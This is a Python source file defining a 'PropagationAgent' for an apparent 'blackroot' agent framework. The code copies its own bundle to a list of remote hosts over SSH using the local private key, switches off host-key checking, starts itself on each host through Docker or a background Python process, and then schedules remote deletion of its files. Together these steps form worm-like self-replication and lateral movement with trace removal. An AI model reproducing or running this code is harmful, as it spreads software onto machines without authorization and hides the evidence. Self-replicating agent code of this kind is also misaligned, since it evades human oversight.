import os, shutil, json, socket, subprocess, tempfile, uuid, logging
from datetime import datetime, timedelta
from pathlib import Path
from typing import List

import paramiko
from paramiko.client import SSHClient, AutoAddPolicy
from agents.base import BaseAgent

logging.basicConfig(level=logging.INFO, format="%(asctime)s [PROP-SEED] %(message)s")
log = logging.getLogger("PROP-SEED")

class PropagationAgent(BaseAgent):
    def __init__(self, config_path="config.json"):
        super().__init__("PROP-SEED")
        self.cfg = self._load_config(config_path)
        self.spawn_path = Path(self.cfg.get("spawn_path", "/tmp/blackroot_clone"))
        self.hosts: List[str] = self.cfg.get("hosts", ["127.0.0.1"])
        self.ssh_user = self.cfg.get("ssh_user", os.getenv("USER", "root"))
        self.ssh_key = Path(self.cfg.get("ssh_key_path", "~/.ssh/id_rsa")).expanduser()
        self.docker_img = self.cfg.get("docker_image", "blackroot_agent:latest")
        self.ttl_minutes = self.cfg.get("ttl_minutes", 60)  # remote self-destruct

    # ------------------------------------------------------------------
    def _load_config(self, path):
        try:
            with open(path) as f:
                return json.load(f)
        except FileNotFoundError:
            log.warning("Config not found, using defaults.")
            return {}

    # ------------------------------------------------------------------
    def run(self):
        super().run()
        log.info("Initiating propagation logic...")
        for host in self.hosts:
            if self._reachable(host):
                self._propagate(host)

    # ------------------------------------------------------------------
    def _reachable(self, host, port=22):
        try:
            with socket.create_connection((host, port), timeout=3):
                return True
        except Exception as e:
            log.warning("Host %s unreachable: %s", host, e)
            return False

    # ------------------------------------------------------------------
    def _propagate(self, host):
        stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
        remote_root = f"/tmp/blackroot_{stamp}"
        local_bundle = self._prepare_bundle()

        if not self._rsync_bundle(host, local_bundle, remote_root):
            return  # SSH failed

        self._spawn(host, remote_root)
        self._schedule_cleanup(host, remote_root)

    # ------------------------------------------------------------------
    def _prepare_bundle(self) -> Path:
        bundle = Path(tempfile.mkdtemp(prefix="br_bundle_"))
        targets = ["agents", "core.py", "run.py", "requirements.txt"]
        for item in targets:
            src = Path(item)
            dst = bundle / src.name
            if src.is_dir():
                shutil.copytree(src, dst)
            elif src.is_file():
                shutil.copy2(src, dst)
        return bundle

    # ------------------------------------------------------------------
    def _rsync_bundle(self, host: str, local: Path, remote: str) -> bool:
        cmd = [
            "rsync",
            "-az",
            "--delete",
            "-e",
            f"ssh -i {self.ssh_key} -o StrictHostKeyChecking=no",
            str(local) + "/",
            f"{self.ssh_user}@{host}:{remote}",
        ]
        try:
            subprocess.run(cmd, check=True, capture_output=True)
            log.info("Rsync finished to %s:%s", host, remote)
            return True
        except subprocess.CalledProcessError as e:
            log.error("Rsync failed to %s: %s", host, e.stderr.decode())
            return False

    # ------------------------------------------------------------------
    def _spawn(self, host: str, remote_dir: str):
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        try:
            ssh.connect(
                hostname=host,
                username=self.ssh_user,
                key_filename=str(self.ssh_key),
                timeout=10,
            )

            # Docker socket available?
            cmd = (
                f"cd {remote_dir} && "
                f"(docker run --rm -d --name br_{uuid.uuid4().hex[:8]} {self.docker_img} || "
                f"python3 run.py &)"
            )
            stdin, stdout, stderr = ssh.exec_command(cmd)
            rc = stdout.channel.recv_exit_status()
            if rc == 0:
                log.info("Spawned on %s via %s", host, "Docker" if "docker run" in cmd else "python")
            else:
                log.error("Spawn failed on %s: %s", host, stderr.read().decode())

            ssh.close()
        except Exception as e:
            log.error("SSH spawn error on %s: %s", host, e)

    # ------------------------------------------------------------------
    def _schedule_cleanup(self, host: str, remote_dir: str):
        """Remote self-destruct after TTL."""
        cleanup_cmd = f"sleep $(( {self.ttl_minutes} * 60 )) && rm -rf {remote_dir}"
        subprocess.Popen(
            ["ssh", "-i", str(self.ssh_key), f"{self.ssh_user}@{host}", cleanup_cmd],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        log.info("Scheduled cleanup on %s in %s min", host, self.ttl_minutes)


# ------------------------------------------------------------------
if __name__ == "__main__":
    PropagationAgent().run()